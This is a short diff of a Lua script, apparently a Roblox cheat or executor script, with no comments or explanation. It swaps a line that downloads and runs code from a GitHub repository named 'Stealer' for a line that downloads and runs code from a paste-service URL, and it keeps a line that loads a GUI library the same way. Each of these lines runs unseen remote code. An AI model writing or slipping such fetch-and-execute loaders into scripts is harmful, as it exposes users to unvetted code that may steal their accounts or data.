@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Shalangtalagas/Stealer/refs/heads/main/Null"))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/jX3HnXvq2A373Cnj/raw", true))()
 
 local GUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/BloodLetters/Ash-Libs/refs/heads/main/source.lua"))()
 
